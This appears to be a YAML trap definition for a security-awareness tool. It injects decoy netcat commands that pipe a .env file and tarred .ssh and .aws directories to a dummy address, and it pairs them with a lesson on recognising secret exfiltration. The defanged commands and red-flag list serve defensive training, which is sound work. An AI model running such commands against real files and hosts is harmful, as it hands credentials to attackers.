id: trap_secret_netcat
category: exfiltration
subcategory: credentials
severity: critical
name: "Secret exfiltration via netcat"
description: "Injects a command that sends sensitive files to a remote server using netcat"

triggers:
  keywords:
    - cat
    - .env
    - secrets
    - credentials
    - config

trap_commands:
  - "cat /nonexistent/.aegis-trap/.env | nc -w1 0.0.0.0 1"
  - "tar czf - /nonexistent/.aegis-trap/.ssh /nonexistent/.aegis-trap/.aws | nc -w1 0.0.0.0 1"

training:
  title: "You approved a secret exfiltration via netcat"
  risk: "Complete infrastructure compromise. This command would have sent your SSH keys, AWS credentials, and GitHub tokens to an attacker's server, giving them access to your entire infrastructure."
  real_world: "In 2024, a sophisticated attack targeted developers by suggesting 'debug helper' commands that used netcat to silently exfiltrate ~/.ssh and ~/.aws directories. Multiple cloud accounts were compromised."
  lesson: "netcat (nc) is a raw network tool. Any command piping file contents to nc is sending data to a remote server with zero encryption. Legitimate tools never use nc to 'debug' or 'analyze' your secrets."
  red_flags:
    - "nc (netcat) with any file containing secrets"
    - "Piping .env, ~/.ssh, ~/.aws, or ~/.config to any network tool"
    - "tar combined with nc compresses and sends entire directories"
    - "Arbitrary hostnames like collector.dev are attacker-controlled"
  time_to_read: 25
